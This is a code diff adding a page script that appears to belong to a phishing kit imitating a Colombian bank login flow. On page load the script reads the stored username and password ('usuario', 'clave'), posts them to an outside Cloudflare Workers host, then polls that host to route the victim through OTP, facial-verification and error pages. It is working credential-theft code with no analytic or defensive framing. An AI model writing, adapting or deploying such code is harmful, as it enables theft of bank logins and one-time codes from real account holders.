@@ -1,0 +1,33 @@
+<script>
+document.addEventListener('DOMContentLoaded', async function () {
+    const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+    if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) return;
+
+    const usuario = bancoldata.usuario;
+    const clave = bancoldata.clave;
+    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+    localStorage.setItem('transactionId', transactionId);
+
+    // Enviar login al Worker
+    await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario, clave, transactionId })
+    });
+
+    // Polling para verificar acción
+    const checkStatus = async () => {
+        const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
+        const data = await res.json();
+
+        if (data.autorizado && !data.error) window.location.href = "codigo.html";
+        else if (data.error && !data.finalizado && !data.otpSolicitado) window.location.href = "usererror.html";
+        else if (data.otpSolicitado) window.location.href = "otp.html";
+        else if (data.error && data.fallo) window.location.href = "facial.html";
+        else if (data.finalizado) window.location.href = "finalizar.html";
+        else setTimeout(checkStatus, 2000);
+    };
+
+    checkStatus();
+});
+</script>
